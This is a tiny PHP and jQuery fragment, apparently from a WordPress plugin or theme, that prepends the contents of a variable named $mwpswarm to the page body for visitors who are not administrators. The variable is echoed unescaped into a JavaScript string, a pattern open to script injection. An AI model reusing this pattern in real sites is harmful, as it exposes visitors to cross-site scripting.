<?php if(!is_admin()){?>
jQuery(document).ready(function($) {
	$("body").prepend('<?php echo $mwpswarm ?>');
});
<?php }?>